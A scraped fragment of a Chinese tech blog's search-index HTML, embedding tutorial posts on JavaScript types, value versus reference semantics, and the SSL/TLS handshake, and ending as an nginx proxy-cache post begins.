&lt;p&gt;&lt;a href=&#34;https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/typeof&#34;&gt;MDN-typeof&lt;/a&gt;&lt;/p&gt;
">87-js-3-typeof运算符</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/javascript-yuan-shi-lei-xing-he-yin-yong-lei-xing/"" data-c="
          &lt;h2 id=&#34;概述&#34;&gt;概述&lt;/h2&gt;
&lt;p&gt;通常，数值、字符串、布尔值这三种类型，合称为原始类型（primitive type）的值，即它们是最基本的数据类型，不能再细分了。对象则称为合成类型（complex type）的值，因为一个对象往往是多个原始类型的值的合成，可以看作是一个存放各种值的容器。至于&lt;code&gt;undefined&lt;/code&gt;和&lt;code&gt;null&lt;/code&gt;，一般将它们看成两个特殊值。&lt;/p&gt;
&lt;h2 id=&#34;栈内存和堆内存&#34;&gt;栈内存和堆内存&lt;/h2&gt;
&lt;h3 id=&#34;栈内存&#34;&gt;栈内存&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;存储的值大小固定&lt;/li&gt;
&lt;li&gt;空间较小&lt;/li&gt;
&lt;li&gt;可以直接操作其保存的变量，运行效率高&lt;/li&gt;
&lt;li&gt;由系统自动分配存储空间&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;堆内存&#34;&gt;堆内存&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;存储的值大小不定，可动态调整&lt;/li&gt;
&lt;li&gt;空间较大，运行效率低&lt;/li&gt;
&lt;li&gt;无法直接操作其内部存储，使用引用地址读取&lt;/li&gt;
&lt;li&gt;通过代码进行分配空间&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;值类型&#34;&gt;值类型&lt;/h2&gt;
&lt;h3 id=&#34;解析&#34;&gt;解析&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;// 值类型
let a = 100
let b = a
a = 200
console.log(b) // 100
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;JavaScript&lt;/code&gt;中的原始类型的值被直接存储在栈中，在变量定义时，栈就为其分配好了内存空间。&lt;/p&gt;
&lt;p&gt;内存中有一个变量&lt;code&gt;a&lt;/code&gt;，值为&lt;code&gt;100&lt;/code&gt;。我们从变量&lt;code&gt;a&lt;/code&gt;复制出一个变量&lt;code&gt;b&lt;/code&gt;，此时在内存中创建了一个块新的空间用于存储&lt;code&gt;b&lt;/code&gt;，虽然两者值是相同的，但是两者指向的内存空间完全不同，这两个变量参与任何操作都互不影响。当改变a后，b指向的空间存储的值仍为&lt;code&gt;100&lt;/code&gt;&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://leecss.com/post-images/1629504334414.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h3 id=&#34;比较&#34;&gt;比较&lt;/h3&gt;
&lt;p&gt;对于原始类型，比较时会直接比较它们的值，如果值相等，即返回&lt;code&gt;true&lt;/code&gt;。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;var a = &#39;abc&#39;;
var b = &#39;abc&#39;;
console.log(a === b); // true
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;常见值类型&#34;&gt;常见值类型&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;// 常见值类型
let a // undefined
const s = &#39;abc&#39;
const n = 100
const b = true
const s = Symbol(&#39;s&#39;)
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;引用类型&#34;&gt;引用类型&lt;/h2&gt;
&lt;h3 id=&#34;解析-2&#34;&gt;解析&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;// 引用类型
let a = { age: 20 }
let b = a
b.age = 21
console.log(a.age) // 21
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;引用类型的值实际存储在堆内存中，它在栈中只存储了一个固定长度的地址，这个地址指向堆内存中的值。&lt;/p&gt;
&lt;p&gt;当我们复制引用类型的变量时，实际上复制的是栈中存储的地址，所以复制出来的&lt;code&gt;b&lt;/code&gt;实际上和&lt;code&gt;a&lt;/code&gt;指向的堆中同一个对象。因此，我们改变其中任何一个变量的值，另一个变量都会受到影响，这就是为什么会有深拷贝和浅拷贝的原因。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://leecss.com/post-images/1629504342917.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h3 id=&#34;比较-2&#34;&gt;比较&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;var obja = { age: 20 }
var objb = { age: 20 }
console.log(obja === objb); // false
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;对于引用类型，比较时会比较它们的引用地址，虽然两个变量在堆中存储的对象具有的属性值都是相等的，但是它们被存储在了不同的存储空间，因此比较值为&lt;code&gt;false&lt;/code&gt;。&lt;/p&gt;
&lt;h3 id=&#34;常见引用类型&#34;&gt;常见引用类型&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;// 常见引用类型
const obj = { x: 100 }
const arr = [&#39;a&#39;, &#39;b&#39;, &#39;c&#39;]
// 特殊引用类型，指针指向为空地址
const n = null
// 特殊引用类型，但不用于存储数据，所以没有&amp;quot;拷贝、复制函数&amp;quot;一说
function fn() {}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;推荐阅读&#34;&gt;推荐阅读&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/u012836896/article/details/89973820&#34;&gt;栈和堆的区别&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://www.conardli.top/blog/article/JS%E8%BF%9B%E9%98%B6/%E4%BD%A0%E7%9C%9F%E7%9A%84%E6%8E%8C%E6%8F%A1%E5%8F%98%E9%87%8F%E5%92%8C%E7%B1%BB%E5%9E%8B%E4%BA%86%E5%90%97%EF%BC%88%E4%B8%80%EF%BC%89%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B.html#%E5%AF%BC%E8%AF%BB&#34;&gt;你真的掌握变量和类型了吗（一）&lt;/a&gt;&lt;/p&gt;
"> 86-js-2-原始类型和引用类型</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/javascript-shu-ju-lei-xing/"" data-c="
          &lt;h2 id=&#34;概述&#34;&gt;概述&lt;/h2&gt;
&lt;p&gt;JavaScript 语言的每一个值，都属于某一种数据类型。&lt;/p&gt;
&lt;p&gt;在 JavaScript 中有 8 种基本的数据类型（7 种原始类型和 1 种引用类型）。&lt;/p&gt;
&lt;p&gt;原始类型：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;数值（number）：整数和小数（比如&lt;code&gt;1&lt;/code&gt;和&lt;code&gt;3.14&lt;/code&gt;）。&lt;/li&gt;
&lt;li&gt;字符串（string）：文本（比如&lt;code&gt;Hello World&lt;/code&gt;）。&lt;/li&gt;
&lt;li&gt;布尔值（boolean）：表示真伪的两个特殊值，即&lt;code&gt;true&lt;/code&gt;（真）和&lt;code&gt;false&lt;/code&gt;（假）。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;undefined&lt;/code&gt;：表示“未定义”或不存在，即由于目前没有定义，所以此处暂时没有任何值。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;null&lt;/code&gt;：表示空值，即此处的值为空。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;symbol&lt;/code&gt;(es6新增): 用于创建对象的唯一标识符。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;bigInt&lt;/code&gt;(es10新增)：表示任意长度的整数。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;引用(对象/合成)类型:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;对象（object）：各种值组成的集合。&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;对象是最复杂的数据类型，又可以分成三个子类型。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;狭义的对象（object）&lt;/li&gt;
&lt;li&gt;数组（array）&lt;/li&gt;
&lt;li&gt;函数（function）&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;动态类型&#34;&gt;动态类型&lt;/h2&gt;
&lt;p&gt;我们可以将任何类型的值存入变量。例如，一个变量可以在前一刻是个字符串，下一刻就存储一个数字：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;// 没有错误
let message = &amp;quot;hello&amp;quot;;
message = 123456;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;允许这种操作的编程语言，例如 JavaScript，被称为“动态类型”（dynamically typed）的编程语言，意思是虽然编程语言中有不同的数据类型，但是你定义的变量并不会在定义后，被限制为某一数据类型。&lt;/p&gt;
&lt;h2 id=&#34;number&#34;&gt;number&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;let n = 123;
n = 12.345;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;em&gt;number&lt;/em&gt; 类型代表整数和浮点数。&lt;/p&gt;
&lt;p&gt;数字可以有很多操作，比如，乘法 &lt;code&gt;*&lt;/code&gt;、除法 &lt;code&gt;/&lt;/code&gt;、加法 &lt;code&gt;+&lt;/code&gt;、减法 &lt;code&gt;-&lt;/code&gt; 等等。&lt;/p&gt;
&lt;p&gt;除了常规的数字，还包括所谓的“特殊数值（“special numeric values”）”也属于这种类型：&lt;code&gt;Infinity&lt;/code&gt;、&lt;code&gt;-Infinity&lt;/code&gt; 和 &lt;code&gt;NaN&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Infinity&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Infinity&lt;/code&gt; 代表数学概念中的 &lt;a href=&#34;https://en.wikipedia.org/wiki/Infinity&#34;&gt;无穷大&lt;/a&gt; ∞。是一个比任何数字都大的特殊值。&lt;/p&gt;
&lt;p&gt;我们可以通过除以 0 来得到它：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;alert( 1 / 0 ); // Infinity
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;或者在代码中直接使用它：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;alert( Infinity ); // Infinity
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;NaN&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;NaN&lt;/code&gt; 代表一个计算错误。它是一个不正确的或者一个未定义的数学操作所得到的结果，比如：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;alert( &amp;quot;not a number&amp;quot; / 2 ); // NaN，这样的除法是错误的
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;NaN&lt;/code&gt; 是粘性的。任何对 &lt;code&gt;NaN&lt;/code&gt; 的进一步操作都会返回 &lt;code&gt;NaN&lt;/code&gt;：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;alert( &amp;quot;not a number&amp;quot; / 2 + 5 ); // NaN
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;所以，如果在数学表达式中有一个 &lt;code&gt;NaN&lt;/code&gt;，会被传播到最终结果。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;数学运算是安全的&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;在 JavaScript 中做数学运算是安全的。我们可以做任何事：除以 0，将非数字字符串视为数字，等等。&lt;/p&gt;
&lt;p&gt;脚本永远不会因为一个致命的错误（“死亡”）而停止。最坏的情况下，我们会得到 &lt;code&gt;NaN&lt;/code&gt; 的结果。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;bigint&#34;&gt;bigInt&lt;/h2&gt;
&lt;p&gt;在 JavaScript 中，“number” 类型无法表示大于 &lt;code&gt;(253-1)&lt;/code&gt;（即 &lt;code&gt;9007199254740991&lt;/code&gt;），或小于 &lt;code&gt;-(253-1)&lt;/code&gt; 的整数。这是其内部表示形式导致的技术限制。&lt;/p&gt;
&lt;p&gt;在大多数情况下，这个范围就足够了，但有时我们需要很大的数字，例如用于加密或微秒精度的时间戳。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;BigInt&lt;/code&gt; 类型是最近被添加到 JavaScript 语言中的，用于表示任意长度的整数。&lt;/p&gt;
&lt;p&gt;可以通过将 &lt;code&gt;n&lt;/code&gt; 附加到整数字段的末尾来创建 &lt;code&gt;BigInt&lt;/code&gt; 值。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;// 尾部的 &amp;quot;n&amp;quot; 表示这是一个 BigInt 类型
const bigInt = 1234567890123456789012345678901234567890n;
&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;兼容性问题&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;目前 Firefox/Chrome/Edge/Safari 已经支持 &lt;code&gt;BigInt&lt;/code&gt; 了，但 IE 还没有。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;string&#34;&gt;string&lt;/h2&gt;
&lt;p&gt;JavaScript 中的字符串必须被括在引号里。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;let str = &amp;quot;Hello&amp;quot;;
let str2 = &#39;Single quotes are ok too&#39;;
let phrase = `can embed another ${str}`;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在 JavaScript 中，有三种包含字符串的方式。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;双引号：&lt;code&gt;&amp;quot;Hello&amp;quot;&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;单引号：&lt;code&gt;&#39;Hello&#39;&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;反引号：&lt;code&gt;Hello&lt;/code&gt;.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;双引号和单引号都是“简单”引用，在 JavaScript 中两者几乎没有什么差别。&lt;/p&gt;
&lt;p&gt;反引号是 &lt;strong&gt;功能扩展&lt;/strong&gt; 引号。它们允许我们通过将变量和表达式包装在 &lt;code&gt;${…}&lt;/code&gt; 中，来将它们嵌入到字符串中。例如：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;let name = &amp;quot;John&amp;quot;;

// 嵌入一个变量
alert( `Hello, ${name}!` ); // Hello, John!

// 嵌入一个表达式
alert( `the result is ${1 + 2}` ); // the result is 3
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;${…}&lt;/code&gt; 内的表达式会被计算，计算结果会成为字符串的一部分。可以在 &lt;code&gt;${…}&lt;/code&gt; 内放置任何东西：诸如名为 &lt;code&gt;name&lt;/code&gt; 的变量，或者诸如 &lt;code&gt;1 + 2&lt;/code&gt; 的算数表达式，或者其他一些更复杂的。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;JavaScript 中没有 character 类型。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;在一些语言中，单个字符有一个特殊的 “character” 类型，在 C 语言和 Java 语言中被称为 “char”。&lt;/p&gt;
&lt;p&gt;在 JavaScript 中没有这种类型。只有一种 &lt;code&gt;string&lt;/code&gt; 类型，一个字符串可以包含零个（为空）、一个或多个字符。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;let name = &amp;quot;Ilya&amp;quot;;

// 表达式为数字 1
alert( `hello ${1}` ); // hello 1

// 表达式是一个字符串 &amp;quot;name&amp;quot;
alert( `hello ${&amp;quot;name&amp;quot;}` ); // hello name

// 表达式是一个变量，嵌入进去了。
alert( `hello ${name}` ); // hello Ilya
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;boolean&#34;&gt;boolean&lt;/h2&gt;
&lt;p&gt;boolean 类型仅包含两个值：&lt;code&gt;true&lt;/code&gt; 和 &lt;code&gt;false&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;这种类型通常用于存储表示 yes 或 no 的值：&lt;code&gt;true&lt;/code&gt; 意味着 “yes，正确”，&lt;code&gt;false&lt;/code&gt; 意味着 “no，不正确”。&lt;/p&gt;
&lt;p&gt;比如：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;let nameFieldChecked = true; // yes, name field is checked
let ageFieldChecked = false; // no, age field is not checked
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;布尔值也可作为比较的结果：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;let isGreater = 4 &amp;gt; 1;

alert( isGreater ); // true（比较的结果是 &amp;quot;yes&amp;quot;）
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;null&#34;&gt;null&lt;/h2&gt;
&lt;p&gt;它构成了一个独立的类型，只包含 &lt;code&gt;null&lt;/code&gt; 值：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;let age = null;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;相比较于其他编程语言，JavaScript 中的 &lt;code&gt;null&lt;/code&gt; 不是一个“对不存在的 &lt;code&gt;object&lt;/code&gt; 的引用”或者 “null 指针”。&lt;/p&gt;
&lt;p&gt;JavaScript 中的 &lt;code&gt;null&lt;/code&gt; 仅仅是一个代表“无”、“空”或“值未知”的特殊值。&lt;/p&gt;
&lt;p&gt;上面的代码表示 &lt;code&gt;age&lt;/code&gt; 是未知的。&lt;/p&gt;
&lt;h2 id=&#34;undefined&#34;&gt;undefined&lt;/h2&gt;
&lt;p&gt;特殊值 &lt;code&gt;undefined&lt;/code&gt; 和 &lt;code&gt;null&lt;/code&gt; 一样自成类型。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;undefined&lt;/code&gt; 的含义是 &lt;code&gt;未被赋值&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;如果一个变量已被声明，但未被赋值，那么它的值就是 &lt;code&gt;undefined&lt;/code&gt;：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;let age;

alert(age); // 弹出 &amp;quot;undefined&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;从技术上讲，可以显式地将 &lt;code&gt;undefined&lt;/code&gt; 赋值给变量：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-js&#34;&gt;let age = 100;

// 将值修改为 undefined
age = undefined;

alert(age); // &amp;quot;undefined&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;但是不建议这样做。通常，使用 &lt;code&gt;null&lt;/code&gt; 将一个“空”或者“未知”的值写入变量中，而 &lt;code&gt;undefined&lt;/code&gt; 则保留作为未进行初始化的事物的默认初始值。&lt;/p&gt;
&lt;h2 id=&#34;symbol&#34;&gt;symbol&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;symbol&lt;/code&gt; 类型用于创建对象的唯一标识符。&lt;/p&gt;
&lt;h2 id=&#34;object&#34;&gt;object&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;object&lt;/code&gt; 类型是一个特殊的类型。&lt;/p&gt;
&lt;p&gt;其他所有的数据类型都被称为“原始类型”，因为它们的值只包含一个单独的内容（字符串、数字或者其他）。相反，&lt;code&gt;object&lt;/code&gt; 则用于储存数据集合和更复杂的实体。&lt;/p&gt;
&lt;h2 id=&#34;总结&#34;&gt;总结&lt;/h2&gt;
&lt;p&gt;JavaScript 中有八种基本的数据类型（译注：前七种为基本数据类型，也称为原始类型，而 &lt;code&gt;object&lt;/code&gt; 为复杂数据类型）。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;number&lt;/code&gt; 用于任何类型的数字：整数或浮点数，在 &lt;code&gt;±(253-1)&lt;/code&gt; 范围内的整数。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;bigint&lt;/code&gt; 用于任意长度的整数。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;string&lt;/code&gt; 用于字符串：一个字符串可以包含 0 个或多个字符，所以没有单独的单字符类型。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;boolean&lt;/code&gt; 用于 &lt;code&gt;true&lt;/code&gt; 和 &lt;code&gt;false&lt;/code&gt;。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;null&lt;/code&gt; 用于未知的值 —— 只有一个 &lt;code&gt;null&lt;/code&gt; 值的独立类型。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;undefined&lt;/code&gt; 用于未定义的值 —— 只有一个 &lt;code&gt;undefined&lt;/code&gt; 值的独立类型。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;symbol&lt;/code&gt; 用于唯一的标识符。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;object&lt;/code&gt; 用于更复杂的数据结构。&lt;/li&gt;
&lt;/ul&gt;
">85-js-1-数据类型</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/http-tu-jie-https/"" data-c="
          &lt;h2 id=&#34;概述&#34;&gt;概述&lt;/h2&gt;
&lt;p&gt;本周，&lt;a href=&#34;https://www.cloudflare.com/&#34;&gt;CloudFlare&lt;/a&gt;宣布，开始提供Keyless服务，即你把网站放到它们的CDN上，不用提供自己的私钥，也能使用SSL加密链接。&lt;/p&gt;
&lt;p&gt;我看了CloudFlare的说明（&lt;a href=&#34;https://blog.cloudflare.com/announcing-keyless-ssl-all-the-benefits-of-cloudflare-without-having-to-turn-over-your-private-ssl-keys/&#34;&gt;这里&lt;/a&gt;和&lt;a href=&#34;https://blog.cloudflare.com/keyless-ssl-the-nitty-gritty-technical-details/&#34;&gt;这里&lt;/a&gt;），突然意识到这是绝好的例子，可以用来说明SSL/TLS协议的运行机制。它配有插图，很容易看懂。&lt;/p&gt;
&lt;p&gt;下面，我就用这些图片作为例子，配合我半年前写的&lt;a href=&#34;https://www.ruanyifeng.com/blog/2014/02/ssl_tls.html&#34;&gt;《SSL/TLS协议运行机制的概述》&lt;/a&gt;，来解释SSL协议。&lt;/p&gt;
&lt;h2 id=&#34;一-ssl协议的握手过程&#34;&gt;一、SSL协议的握手过程&lt;/h2&gt;
&lt;p&gt;开始加密通信之前，客户端和服务器首先必须建立连接和交换参数，这个过程叫做握手（handshake）。&lt;/p&gt;
&lt;p&gt;假定客户端叫做爱丽丝，服务器叫做鲍勃，整个握手过程可以用下图说明（点击看大图）。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://leecss.com/post-images/1628722928788.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;握手阶段分成五步。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;第一步，爱丽丝给出协议版本号、一个客户端生成的随机数（Client random），以及客户端支持的加密方法。&lt;/p&gt;
&lt;p&gt;第二步，鲍勃确认双方使用的加密方法，并给出数字证书、以及一个服务器生成的随机数（Server random）。&lt;/p&gt;
&lt;p&gt;第三步，爱丽丝确认数字证书有效，然后生成一个新的随机数（Premaster secret），并使用数字证书中的公钥，加密这个随机数，发给鲍勃。&lt;/p&gt;
&lt;p&gt;第四步，鲍勃使用自己的私钥，获取爱丽丝发来的随机数（即Premaster secret）。&lt;/p&gt;
&lt;p&gt;第五步，爱丽丝和鲍勃根据约定的加密方法，使用前面的三个随机数，生成&amp;quot;对话密钥&amp;quot;（session key），用来加密接下来的整个对话过程。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;上面的五步，画成一张图，就是下面这样。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://leecss.com/post-images/1628722965974.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h2 id=&#34;二-私钥的作用&#34;&gt;二、私钥的作用&lt;/h2&gt;
&lt;p&gt;握手阶段有三点需要注意。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;（1）生成对话密钥一共需要三个随机数。&lt;/p&gt;
&lt;p&gt;（2）握手之后的对话使用&amp;quot;对话密钥&amp;quot;加密（对称加密），服务器的公钥和私钥只用于加密和解密&amp;quot;对话密钥&amp;quot;（非对称加密），无其他作用。&lt;/p&gt;
&lt;p&gt;（3）服务器公钥放在服务器的数字证书之中。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;从上面第二点可知，整个对话过程中（握手阶段和其后的对话），服务器的公钥和私钥只需要用到一次。这就是CloudFlare能够提供Keyless服务的根本原因。&lt;/p&gt;
&lt;p&gt;某些客户（比如银行）想要使用外部CDN，加快自家网站的访问速度，但是出于安全考虑，不能把私钥交给CDN服务商。这时，完全可以把私钥留在自家服务器，只用来解密对话密钥，其他步骤都让CDN服务商去完成。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;3&#34;&gt;&lt;img src=&#34;https://leecss.com/post-images/1628722990019.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;上图中，银行的服务器只参与第四步，后面的对话都不再会用到私钥了。&lt;/p&gt;
&lt;h2 id=&#34;三-dh算法的握手阶段&#34;&gt;三、DH算法的握手阶段&lt;/h2&gt;
&lt;p&gt;整个握手阶段都不加密（也没法加密），都是明文的。因此，如果有人窃听通信，他可以知道双方选择的加密方法，以及三个随机数中的两个。整个通话的安全，只取决于第三个随机数（Premaster secret）能不能被破解。&lt;/p&gt;
&lt;p&gt;虽然理论上，只要服务器的公钥足够长（比如2048位），那么Premaster secret可以保证不被破解。但是为了足够安全，我们可以考虑把握手阶段的算法从默认的&lt;a href=&#34;https://www.ruanyifeng.com/blog/2013/06/rsa_algorithm_part_one.html&#34;&gt;RSA算法&lt;/a&gt;，改为 &lt;a href=&#34;https://zh.wikipedia.org/wiki/%E8%BF%AA%E8%8F%B2%EF%BC%8D%E8%B5%AB%E5%B0%94%E6%9B%BC%E5%AF%86%E9%92%A5%E4%BA%A4%E6%8D%A2&#34;&gt;Diffie-Hellman算法&lt;/a&gt;（简称DH算法）。&lt;/p&gt;
&lt;p&gt;采用DH算法后，Premaster secret不需要传递，双方只要交换各自的参数，就可以算出这个随机数。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;4&#34;&gt;&lt;img src=&#34;https://leecss.com/post-images/1628723043151.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;上图中，第三步和第四步由传递Premaster secret变成了传递DH算法所需的参数，然后双方各自算出Premaster secret。这样就提高了安全性。&lt;/p&gt;
&lt;h2 id=&#34;四-session的恢复&#34;&gt;四、session的恢复&lt;/h2&gt;
&lt;p&gt;握手阶段用来建立SSL连接。如果出于某种原因，对话中断，就需要重新握手。&lt;/p&gt;
&lt;p&gt;这时有两种方法可以恢复原来的session：一种叫做session ID，另一种叫做session ticket。&lt;/p&gt;
&lt;p&gt;session ID的思想很简单，就是每一次对话都有一个编号（session ID）。如果对话中断，下次重连的时候，只要客户端给出这个编号，且服务器有这个编号的记录，双方就可以重新使用已有的&amp;quot;对话密钥&amp;quot;，而不必重新生成一把。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;5&#34;&gt;&lt;img src=&#34;https://leecss.com/post-images/1628723092336.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;上图中，客户端给出session ID，服务器确认该编号存在，双方就不再进行握手阶段剩余的步骤，而直接用已有的对话密钥进行加密通信。&lt;/p&gt;
&lt;p&gt;session ID是目前所有浏览器都支持的方法，但是它的缺点在于session ID往往只保留在一台服务器上。所以，如果客户端的请求发到另一台服务器，就无法恢复对话。session ticket就是为了解决这个问题而诞生的，目前只有Firefox和Chrome浏览器支持。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;6&#34;&gt;&lt;img src=&#34;https://leecss.com/post-images/1628723132146.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;上图中，客户端不再发送session ID，而是发送一个服务器在上一次对话中发送过来的session ticket。这个session ticket是加密的，只有服务器才能解密，其中包括本次对话的主要信息，比如对话密钥和加密方法。当服务器收到session ticket以后，解密后就不必重新生成对话密钥了。&lt;/p&gt;
&lt;h2 id=&#34;转载&#34;&gt;转载&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;阮一峰&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.ruanyifeng.com/blog/2014/09/illustration-ssl.html&#34;&gt;https://www.ruanyifeng.com/blog/2014/09/illustration-ssl.html&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
">84-http-29-图解https</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://leecss.com/post/nginx-dai-li-huan-cun/"" data-c="
          &lt;h2 id=&#34;概述&#34;&gt;概述&lt;/h2&gt;
&lt;p&gt;nginx代理缓存是代理服务器缓存，当有用户A第一次访问后，下一次别的用户访问(或用户A第二次用别的浏览器访问)，就会使用缓存，提升访问速度。&lt;/p&gt;
&lt;h2 id=&#34;配置&#34;&gt;配置&lt;/h2&gt;
&lt;p&gt;test.conf&lt;/p&gt;
